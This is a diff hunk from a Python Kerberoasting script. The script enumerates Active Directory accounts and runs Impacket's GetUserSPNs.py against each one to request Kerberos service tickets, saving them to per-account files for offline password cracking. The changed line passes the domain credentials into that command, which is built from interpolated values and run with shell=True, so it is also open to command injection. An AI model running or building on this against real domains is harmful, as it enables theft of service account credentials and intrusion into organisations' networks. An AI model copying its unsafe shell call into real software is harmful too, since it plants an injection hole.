@@ -17,7 +17,7 @@ def find_and_kerberoast_objects(username, password, domain, dc_ip):
         for entry in conn.entries:
             sAMAccountName = entry['sAMAccountName'].value
             print(f"Kerberoasting {sAMAccountName}...")
-            cmd = f"GetUserSPNs.py -request -dc-ip {dc_ip} -outputfile {sAMAccountName}_tickets.txt {sAMAccountName}"
+            cmd = f"GetUserSPNs.py -request -u {domain}/{username} -p {password} -dc-ip {dc_ip} -outputfile {sAMAccountName}_tickets.txt {sAMAccountName}"
             subprocess.run(cmd, shell=True)
 
         conn.unbind()
